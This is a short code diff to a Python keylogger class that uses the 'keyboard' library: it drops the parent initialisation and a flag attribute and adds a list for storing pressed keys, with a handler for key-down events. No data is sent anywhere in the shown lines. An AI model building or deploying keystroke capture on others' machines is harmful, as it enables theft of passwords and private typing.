@@ -3,9 +3,9 @@ import keyboard
 
 
 class KeyLoggerService(AbstractKeyLoggerService):
+
     def __init__(self):
-        super().__init__()
-        self.flag = False
+        self.keys = []
 
     def _on_event(self, event):
         if event.event_type == keyboard.KEY_DOWN:
